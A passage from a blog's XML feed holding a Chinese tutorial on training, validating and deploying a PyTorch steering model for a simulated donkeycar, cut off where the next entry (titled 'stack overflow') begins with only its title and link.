train_dataset = AutoDriveDataset(data_folder,</span><br><span class="line">                                     mode=<span class="string">&#x27;train&#x27;</span>,</span><br><span class="line">                                     transform=transformations)</span><br><span class="line">    train_loader = torch.utils.data.DataLoader(train_dataset,</span><br><span class="line">                                               batch_size=batch_size,</span><br><span class="line">                                               shuffle=<span class="literal">True</span>,</span><br><span class="line">                                               num_workers=<span class="number">0</span>,</span><br><span class="line">                                               pin_memory=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始逐轮训练</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(start_epoch, epochs + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        model.train()  <span class="comment"># 训练模式：允许使用批样本归一化</span></span><br><span class="line">        loss_epoch = AverageMeter()  <span class="comment"># 统计损失函数</span></span><br><span class="line">        n_iter = <span class="built_in">len</span>(train_loader)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按批处理</span></span><br><span class="line">        <span class="keyword">for</span> i, (imgs, labels) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">            <span class="comment"># 数据移至默认设备进行训练</span></span><br><span class="line">            imgs = imgs.to(device)</span><br><span class="line">            labels = labels.to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 前向传播</span></span><br><span class="line">            pre_labels = model(imgs)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算损失</span></span><br><span class="line">            loss = criterion(pre_labels, labels)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 后向传播</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            loss.backward()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新模型</span></span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录损失值</span></span><br><span class="line">            loss_epoch.update(loss.item(), imgs.size(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印结果</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第 &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; 个batch训练结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 手动释放内存</span></span><br><span class="line">        <span class="keyword">del</span> imgs, labels, pre_labels</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监控损失值变化</span></span><br><span class="line">        writer.add_scalar(<span class="string">&#x27;MSE_Loss&#x27;</span>, loss_epoch.avg, epoch)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span> + <span class="built_in">str</span>(epoch) + <span class="string">&#x27;  MSE_Loss:&#x27;</span> + <span class="built_in">str</span>(loss_epoch.avg))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存预训练模型</span></span><br><span class="line">        torch.save(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;epoch&#x27;</span>: epoch,</span><br><span class="line">                <span class="comment"># &#x27;model&#x27;: model.module.state_dict(),</span></span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: model.state_dict(),</span><br><span class="line">                <span class="string">&#x27;optimizer&#x27;</span>: optimizer.state_dict()</span><br><span class="line">            &#125;, <span class="string">&#x27;results/checkpoint.pth&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练结束关闭监控</span></span><br><span class="line">    writer.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>新旧版更替，不同的运行环境都有可能导致代码报各种错误。这里真是坑到不行qwq。经过我反复测试，大家报错时可以解开就近的注释部分进行尝试，这应该是目前最为稳定的版本了。</p><p>注意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">writer = SummaryWriter()</span><br><span class="line">writer.add_scalar(<span class="string">&#x27;MSE_Loss&#x27;</span>, loss_epoch.avg, epoch)</span><br></pre></td></tr></table></figure><p>第一行代码及下面的相关方法使得我们可以在pycharm下方终端使用命令 tensorboard –logdir runs  ，点击出现的网页链接(用edge或者chome)，可以看到误差改变情况。如果这行代码报错了，请在终端运行命令  pip install tensorboard等待安装完成。反复刷新浏览器可以更新。根据网页提示进行使用。如果测试的时候运行过太多次，可以修改第二行代码的字符串，会生成一个新的表。删除根目录下run的文件也可以起到减少的作用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ngpu = 4  # 用来运行的gpu数量</span></span><br><span class="line"><span class="comment"># 单机多卡训练</span></span><br><span class="line">    <span class="comment"># if torch.cuda.is_available():</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=[0])</span></span><br></pre></td></tr></table></figure><p>只有一个显卡的同学一定要注意保持所有单机多卡训练的代码处于注释状态(我在这儿被坑惨了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">torch.save(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;epoch&#x27;</span>: epoch,</span><br><span class="line">                <span class="comment"># &#x27;model&#x27;: model.module.state_dict(),</span></span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: model.state_dict(),</span><br><span class="line">                <span class="string">&#x27;optimizer&#x27;</span>: optimizer.state_dict()</span><br><span class="line">            &#125;, <span class="string">&#x27;results/checkpoint.pth&#x27;</span>)</span><br></pre></td></tr></table></figure><p>对model字段的保存，有的版本需要用注释里的字段，有的用当前的就行。请注意results文件夹最好手动创建。</p><h3 id="3-4模型验证"><a href="#3-4模型验证" class="headerlink" title="3.4模型验证"></a>3.4模型验证</h3><p>上面的代码需要迭代1000次, epoch&#x3D;1000的时候基本处在一个比较好的收敛位置，此时误差下降到1e-5左右。不过在跑到第140次左右时就已经下降到1e-4，让误差下降一个数量级在实际工程中还是非常重要的，不过同学们在使用的时候其实跑到这样也能用了。</p><p>验证代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.backends.cudnn <span class="keyword">as</span> cudnn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> AutoDriveDataset</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 测试集目录</span></span><br><span class="line">    data_folder = <span class="string">&quot;./data/simulate&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义运行的GPU数量</span></span><br><span class="line">    ngpu = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># cudnn.benchmark = True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义设备运行环境</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;定义设备环境&quot;</span>)</span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载预训练模型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加载预训练模型&quot;</span>)</span><br><span class="line">    checkpoint = torch.load(<span class="string">&quot;./results/checkpoint.pth&quot;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多GPU封装</span></span><br><span class="line">    <span class="comment">#if torch.cuda.is_available():</span></span><br><span class="line">     <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定制化的dataloader</span></span><br><span class="line">    <span class="comment"># 定制dataloader</span></span><br><span class="line">    transformations = transforms.Compose([</span><br><span class="line">        transforms.ToTensor(),  <span class="comment"># 通道置前并且将0-255RGB值映射至0-1</span></span><br><span class="line">        <span class="comment"># transforms.Normalize(</span></span><br><span class="line">        <span class="comment">#     mean=[0.485, 0.456, 0.406],  # 归一化至[-1,1] mean std 来自imagenet 计算</span></span><br><span class="line">        <span class="comment">#     std=[0.229, 0.224, 0.225])</span></span><br><span class="line">    ])</span><br><span class="line">    val_dataset = AutoDriveDataset(data_folder,</span><br><span class="line">                                   mode=<span class="string">&#x27;val&#x27;</span>,</span><br><span class="line">                                   transform=transformations</span><br><span class="line">                                   )</span><br><span class="line"></span><br><span class="line">    val_loader = torch.utils.data.DataLoader(val_dataset, batch_size=<span class="number">1</span>, shuffle=<span class="literal">False</span>, num_workers=<span class="number">1</span>,</span><br><span class="line">                                             pin_memory=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义评估指标</span></span><br><span class="line">    criterion = nn.MSELoss().to(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录误差值</span></span><br><span class="line">    MSEs = AverageMeter()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录测试时间</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开始进行测试&quot;</span>)</span><br><span class="line">        <span class="comment"># 逐批样本进行推理计算</span></span><br><span class="line">        <span class="keyword">for</span> i, (imgs, labels) <span class="keyword">in</span> <span class="built_in">enumerate</span>(val_loader):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次计算进行中&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="comment"># 数据移至默认设备进行推理</span></span><br><span class="line">            imgs = imgs.to(device)</span><br><span class="line">            labels = labels.to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 前向传播</span></span><br><span class="line">            pre_labels = model(imgs)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算误差</span></span><br><span class="line">            loss = criterion(pre_labels, labels)</span><br><span class="line">            MSEs.update(loss.item(), imgs.size(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出平均均方误差</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;MSE  &#123;mses.avg: .3f&#125;&#x27;</span>.<span class="built_in">format</span>(mses=MSEs))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;平均单张样本用时  &#123;:.3f&#125; 秒&#x27;</span>.<span class="built_in">format</span>((time.time() - start) / <span class="built_in">len</span>(val_dataset)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/.io//Snipaste_2022-05-01_12-49-31.png"></p><p>我们的转向角度取值范围是[-1, 1]，这样的误差比较小，是可以接受的。请注意多卡训练的同学，一定要解开nn.DataParallel的注释，否则是无法运行的。</p><p>这里等待的时间比较长，所以我增加了一些print输出来判断到底是电脑卡了还是程序在运行。同学们如果配置比较低，也建议这样自行增加一些print。</p><h3 id="3-5单张图片预测"><a href="#3-5单张图片预测" class="headerlink" title="3.5单张图片预测"></a>3.5单张图片预测</h3><p>为什么上一步已经用8000张图片进行预测了，这里还要用单张图片来尝试呢？真实的自动驾驶的时候，我们是要对每一张图片进行分析的。所以这里来尝试一下用单张图片来分析。</p><p>我们选取一张比较有代表性的图片:</p><p><img src="/.io//3976_0.2444.jpg"></p><p>大家可以先猜测一下这个转向角度。</p><p>下面是测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入OpenCV库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 测试图像</span></span><br><span class="line">    imgPath = <span class="string">&#x27;./results/test.jpg&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 推理环境</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载训练好的模型</span></span><br><span class="line">    checkpoint = torch.load(<span class="string">&#x27;./results/checkpoint.pth&#x27;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>],strict=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载图像</span></span><br><span class="line">    img = cv2.imread(imgPath)</span><br><span class="line">    img = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 图像预处理</span></span><br><span class="line">    <span class="comment"># PIXEL_MEANS = (0.485, 0.456, 0.406)  # RGB格式的均值和方差</span></span><br><span class="line">    <span class="comment"># PIXEL_STDS = (0.229, 0.224, 0.225)</span></span><br><span class="line">    img = torch.from_numpy(img.copy()).<span class="built_in">float</span>()</span><br><span class="line">    img /= <span class="number">255.0</span></span><br><span class="line">    <span class="comment"># img -= torch.tensor(PIXEL_MEANS)</span></span><br><span class="line">    <span class="comment"># img /= torch.tensor(PIXEL_STDS)</span></span><br><span class="line">    img = img.permute(<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    img.unsqueeze_(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 转移数据至设备</span></span><br><span class="line">    img = img.to(device)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 模型推理</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        prelabel = model(img).squeeze(<span class="number">0</span>).cpu().detach().numpy()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;预测结果  &#123;:.3f&#125; &#x27;</span>.<span class="built_in">format</span>(prelabel[<span class="number">0</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>请注意一定要把测试的图片移动到result目录下，且命名为test.jpg，或修改代码中对应行。</p><p>测试结果：</p><p><img src="/.io//Snipaste_2022-05-01_13-03-45.png"></p><p>而实际上这台小车正准备右转，转向值为0.244。趋势上是正确的，而效果上也是可以接受的。</p><h3 id="3-6系统集成，自动驾驶"><a href="#3-6系统集成，自动驾驶" class="headerlink" title="3.6系统集成，自动驾驶"></a>3.6系统集成，自动驾驶</h3><p>我们现在可以使用pytorch逐帧分析图像，然后直接给出转向值用于小车控制，不再需要复杂的、分散的图像处理步骤。</p><p>只需要把上一小节的代码和之前的控制代码合并即可实现。编程能力强的同学可以留作练习。</p><p>运行auto_drive.py文件，其完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置推理环境</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载训练好的模型</span></span><br><span class="line">    checkpoint = torch.load(<span class="string">&#x27;./results/checkpoint.pth&#x27;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">0.1</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 执行动作并获取图像</span></span><br><span class="line">    img, reward, done, info = env.step(action)</span><br><span class="line">    img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行5000次动作</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 图像预处理</span></span><br><span class="line">        img = torch.from_numpy(img.copy()).<span class="built_in">float</span>()</span><br><span class="line">        img /= <span class="number">255.0</span></span><br><span class="line">        img = img.permute(<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        img.unsqueeze_(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 转移数据至设备</span></span><br><span class="line">        img = img.to(device)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 模型推理</span></span><br><span class="line">        steering_angle = <span class="number">0</span></span><br><span class="line">        factor=<span class="number">1</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            <span class="comment"># 计算转向角度</span></span><br><span class="line">            steering_angle = (model(img).squeeze(<span class="number">0</span>).cpu().detach().numpy())[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> steering_angle*factor&lt;-<span class="number">1</span>:</span><br><span class="line">                steering_angle=-<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> steering_angle*factor&gt;<span class="number">1</span>:</span><br><span class="line">                steering_angle=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                steering_angle=steering_angle*factor</span><br><span class="line">            <span class="built_in">print</span>(steering_angle)</span><br><span class="line">            action = np.array([steering_angle, <span class="number">0.1</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 执行动作并更新图像</span></span><br><span class="line">            img, reward, done, info = env.step(action)</span><br><span class="line">            img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>从视频效果上看，通过深度学习的自动驾驶小车其操控流畅性感觉上超过了它的“师傅”OpenCV版本。可能的原因在于纯粹的OpenCV图像处理方法对每帧单独处理，没有一个整体的去噪概念，容易在某一帧出现偏差。但是基于深度学习的方法更多的是学习整个数据集的操作体验，某种意义上做了一定的概率去噪，或者说是平均化，因此，整个的操控才会显得更加流畅。</p><p>到这里，这个简单的教程就结束了。恭喜你，你已经入门了end to end自动驾驶(大概)。希望我的拙见可以帮助到大家学习。</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
